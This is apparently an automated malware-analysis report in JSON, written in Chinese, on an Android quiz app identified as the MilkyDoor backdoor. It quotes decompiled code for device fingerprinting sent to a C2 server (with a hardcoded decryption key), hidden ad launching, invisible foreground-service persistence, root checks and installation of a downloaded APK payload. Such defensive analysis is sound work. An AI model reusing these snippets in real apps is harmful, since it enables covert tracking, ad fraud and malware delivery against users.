@@ -1,0 +1,265 @@
+{
+  "APK信息": {
+    "文件名": "3b44b9c9710ca44ea5d71a392c928fc11ba1af7fd1b058c036f4bc67bd87ebf4.apk",
+    "sha256": "3b44b9c9710ca44ea5d71a392c928fc11ba1af7fd1b058c036f4bc67bd87ebf4",
+    "包名": "com.houselab.animalquiz",
+    "应用名": "Animal Quiz",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1005.1
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId",
+          "ANDROID_ID",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\c;",
+          "method_signature": "run()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "str2 = str + \"?v=1.0.3&p=\" + context.getPackageName() + \"&ai=\" + Settings.Secure.getString(context.getContentResolver(), \"android_id\") + \"&fv=1\";\nnew Scanner(new URL(str2).openStream(), \"UTF-8\").useDelimiter(\"\\\\A\").next();\nnew String(Base64.decode(\"N2pkN0hDbGFienpHcjk1cQ==\", 0))",
+          "malicious_code_snippet_context": "              public void run() {\n                  String str2 = str;\n                  try {\n>>>                     str2 = str + \"?v=1.0.3&p=\" + context.getPackageName() + \"&ai=\" + Settings.Secure.getString(context.getContentResolver(), \"android_id\") + \"&fv=1\";\n>>>                 } catch (Exception e) {\n>>>                 }\n                  try {\n                      JSONObject jSONObject = new JSONObject(c.a(new Scanner(new URL(str2).openStream(), WebRequest.CHARSET_UTF_8).useDelimiter(\"\\\\A\").next(), new String(Base64.decode(\"N2pkN0hDbGFienpHcjk1cQ==\", 0))));\n                      jSONObject.getJSONObject(\"server_config\").put(\"downloaded_time\", String.valueOf(System.currentTimeMillis()));",
+          "behavior_description": "该代码在后台线程中拼接 URL 查询参数，将应用包名与设备 Android ID 作为指纹信息附加到请求地址上，随后通过 new URL(str2).openStream() 向远程服务器发起 HTTP GET 请求，把设备指纹上报至 C2 服务器；收到响应后使用硬编码 Base64 密钥（解密后为 7jd7HClabzzGr95q）解密出 JSON 格式的 server_config 配置，记录下载时间后持久化保存，并依据配置中的 cheats 字段执行后续逻辑。这是 MilkyDoor 后门的 C2 通信/配置拉取通道，同时完成设备指纹采集与外传。数据流向：Settings.Secure.getString(android_id) 与 getPackageName() → URL 参数拼接 → URL.openStream() 网络外传至远程服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\amazon\\es\\device\\ads\\AdLocation;",
+          "method_signature": "if(LocationAwareness.LOCATION_AWARENESS_DISABLED.equals(locationAwareness)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "LocationManager locationManager = (LocationManager) this.context.getSystemService(\"location\");\nlastKnownLocation = locationManager.getLastKnownLocation(\"gps\");\nlastKnownLocation2 = locationManager.getLastKnownLocation(\"network\");",
+          "malicious_code_snippet_context": "          if (LocationAwareness.LOCATION_AWARENESS_DISABLED.equals(locationAwareness)) {\n              return null;\n          }\n>>>         LocationManager locationManager = (LocationManager) this.context.getSystemService(\"location\");\n>>>         try {\n>>>             lastKnownLocation = locationManager.getLastKnownLocation(\"gps\");\n          } catch (IllegalArgumentException e) {\n              this.logger.d(\"Failed to retrieve GPS location: No GPS found\");\n              lastKnownLocation = null;",
+          "behavior_description": "该代码位于Amazon广告SDK的AdLocation类中，通过系统LocationManager分别从GPS和网络提供商被动获取设备最后已知位置（getLastKnownLocation），并将位置数据返回给SDK上层模块，用于广告定向投放并通常随广告请求上报至远程广告服务器。数据流向：系统位置服务→getLastKnownLocation(\"gps\")/getLastKnownLocation(\"network\")→返回给广告SDK调用方（进而可能通过网络上传）。虽然代码检查了LOCATION_AWARENESS_DISABLED开关（存在一定可控性），且属于广告SDK的标准位置感知功能，但在恶意样本环境中该行为构成对用户位置隐私的过度收集，属于典型的广告SDK隐私收集灰色行为，而非直接恶意窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ad_fraud",
+      "中文名": "广告欺诈",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "hidden_ad",
+          "中文名": "隐藏广告",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "Interstitial",
+              "loadAd",
+              "showAd",
+              "adView",
+              "Banner"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\ac\\a;",
+          "method_signature": "a(boolean z)",
+          "malicious_behavior": "ad_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent();\nintent.setClassName(this.a.getApplicationContext().getPackageName(), \"android.system.ac.TaskShowAdActivity\");\nintent.addFlags(1417707520);\nintent.putExtra(\"placement\", this.b);\nthis.a.startActivity(intent);",
+          "malicious_code_snippet_context": "      public void a(boolean z) {\n          try {\n              b.a(\"starting activity \");\n>>>             Intent intent = new Intent();\n>>>             intent.setClassName(this.a.getApplicationContext().getPackageName(), \"android.system.ac.TaskShowAdActivity\");\n>>>             intent.addFlags(1417707520);\n>>>             intent.putExtra(\"placement\", this.b);\n>>>             if (z) {\n                  intent.putExtra(\"ch\", \"true\");\n              } else {\n                  intent.putExtra(\"ch\", \"false\");",
+          "behavior_description": "该代码构造Intent隐蔽启动应用内部的广告展示组件 android.system.ac.TaskShowAdActivity（包名伪装成系统命名空间android.system以规避检测），携带placement广告位参数和ch渠道标志。addFlags(1417707520)即FLAG_ACTIVITY_NEW_TASK|NO_HISTORY|CLEAR_TOP|EXCLUDE_FROM_RECENTS|CLEAR_TASK的组合，使广告Activity在独立任务中启动、不留历史记录、不出现在最近任务列表，实现用户无感知的后台隐藏广告展示，刷取广告展示量实施广告欺诈。数据流向：构造函数传入的placement广告位字符串→Intent.putExtra→startActivity()以隐蔽flag启动隐藏广告页面。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\sa\\SS;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 16)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setOngoing(true).build();\nstartForeground(VASTModel.ERROR_CODE_XML_VALIDATE, notification);",
+          "malicious_code_snippet_context": "              if (bitmapB != null) {\n                  b.a(\"icon != null\");\n                  if (Build.VERSION.SDK_INT >= 16) {\n>>>                     notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build();\n>>>                 } else {\n                      notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).getNotification();\n                  }\n              } else {",
+          "behavior_description": "该代码位于伪装成系统包名的 android.system.sa.SS 服务中（MilkyDoor 后门样本）。它通过 Notification.Builder 构造标题和内容均为空字符串、且 setOngoing(true) 的'隐形'通知，随后调用 startForeground() 将自身提升为前台服务，利用 Android 前台服务高优先级机制在用户完全无感知的情况下实现进程保活、规避系统查杀。配合 b() 方法中对 drive/gmail/music/services/store/youtube 等字符串的判断（用于窃取并伪装成 Google 官方应用图标），进一步隐藏恶意服务的存在。该隐蔽保活机制为 MilkyDoor 后门持续维持与 C2 服务器的 SOCKS 代理/内网穿透连接提供持久化保障。数据流向：本地构造的空内容隐形通知 → startForeground() 前台服务保活（用户不可见、常驻后台）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "root_exploitation",
+      "中文名": "Root提权",
+      "MITRE": "T1407",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "/system/bin/su",
+          "/system/xbin/su",
+          "/sbin/su",
+          "Superuser.apk"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chartboost\\es\\sdk\\Libraries\\CBUtility;",
+          "method_signature": "i()",
+          "malicious_behavior": "root_exploitation",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static boolean h() { String str = Build.TAGS; return str != null && str.contains(\"test-keys\"); }\nprivate static boolean i() { return new File(\"/system/app/Superuser.apk\").exists(); }\nprivate static boolean j() { for (String str : new String[]{\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"}) { if (new File(str).exists()) { return true; } } return false; }",
+          "malicious_code_snippet_context": "private static boolean h() { String str = Build.TAGS; return str != null && str.contains(\"test-keys\"); }\nprivate static boolean i() { return new File(\"/system/app/Superuser.apk\").exists(); }\nprivate static boolean j() { for (String str : new String[]{\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"}) { if (new File(str).exists()) { return true; } } return false; }",
+          "behavior_description": "该代码位于伪装成 Chartboost 广告 SDK 的类 com.chartboost.es.sdk.Libraries.CBUtility 中（真实 Chartboost 包名为 com.chartboost.sdk，此处为 MilkyDoor 后门的伪装壳），构成一套完整的 Root 环境探测模块：方法 i() 通过 File.exists() 检查 /system/app/Superuser.apk 是否存在；方法 h() 读取系统属性 Build.TAGS 判断是否包含 test-keys（非官方 ROM/已解锁标志）；方法 j() 遍历 /sbin/su、/system/bin/su、/system/xbin/su 等 8 个常见 su 二进制路径。数据流向：读取系统属性与文件系统状态（source）→ 探测设备 Root 权限环境（sink）。在已确认的 MilkyDoor 恶意样本中，该探测结果被后门用于判断设备是否已 Root，进而决定是否执行提权操作、将自身静默安装至 /system 分区实现系统级持久化，或将设备 Root 状态上报 C2 服务器，属于提权利用链中的环境侦察环节。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish"
+            ]
+          }
+        },
+        {
+          "子行为": "anti_root",
+          "中文名": "反Root",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "/system/bin/su",
+              "Superuser.apk"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chartboost\\es\\sdk\\Libraries\\CBUtility;",
+          "method_signature": "i()",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static boolean h() { String str = Build.TAGS; return str != null && str.contains(\"test-keys\"); }  private static boolean i() { return new File(\"/system/app/Superuser.apk\").exists(); }  private static boolean j() { for (String str : new String[]{\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"}) { if (new File(str).exists()) { return true; } } return false; }",
+          "malicious_code_snippet_context": "private static boolean h() { String str = Build.TAGS; return str != null && str.contains(\"test-keys\"); }  private static boolean i() { return new File(\"/system/app/Superuser.apk\").exists(); }  private static boolean j() { for (String str : new String[]{\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"}) { if (new File(str).exists()) { return true; } } return false; }",
+          "behavior_description": "该代码是一个多重Root环境检测模块：方法i()检查/system/app/Superuser.apk是否存在；方法h()检查Build.TAGS是否包含'test-keys'（非官方签名ROM的标志）；方法j()遍历/sbin/su、/system/bin/su、/system/xbin/su等8个常见su二进制路径。该代码隐藏于伪装的Chartboost SDK路径（com.chartboost.es.sdk，并非官方SDK包名com.chartboost.sdk）中，属于MilkyDoor后门木马的反检测组件。数据流向：读取文件系统状态（Superuser.apk、su二进制路径）及系统构建属性Build.TAGS（source）→ 综合判定设备是否已Root或是否处于安全分析环境，供恶意程序规避安全研究人员常用的Root设备与动态分析沙箱，帮助后门逃避检测并隐蔽存活（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\ap\\ActionActivity;",
+          "method_signature": "b(String str)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + \"/download/\" + g.a(str) + \".apk\")), \"application/vnd.android.package-archive\");\nintent.setFlags(268435456);\nstartActivity(intent);",
+          "malicious_code_snippet_context": "  \n      private void b(String str) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + \"/download/\" + g.a(str) + \".apk\")), \"application/vnd.android.package-archive\");\n>>>             intent.setFlags(268435456);\n>>>             startActivity(intent);\n          } catch (Exception e) {\n              f.a(e.toString());\n          }",
+          "behavior_description": "该方法位于ActionActivity命令分发框架中，接收远程下发的指令参数str（同类的c()方法解析JSON payload，表明指令来自C2服务器），通过g.a(str)转换生成文件名，拼接外部存储路径/sdcard/download/xxx.apk，构造ACTION_VIEW Intent并设置MIME类型为application/vnd.android.package-archive，调用startActivity()拉起系统包安装器安装该APK。数据流向：远程C2指令参数→文件名转换→外部存储中已下载的恶意APK→触发系统安装器安装载荷。这是典型的下载器/投放器行为，用于在宿主恶意样本（MilkyDoor后门家族）中安装额外的恶意APK载荷。虽然使用ACTION_VIEW会弹出系统安装确认框（非完全静默安装，需用户点击确认且开启未知来源），但结合已确认的恶意样本背景，这是远程指令驱动的恶意载荷投放机制，异常被catch后仅静默记录，对用户无任何提示。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
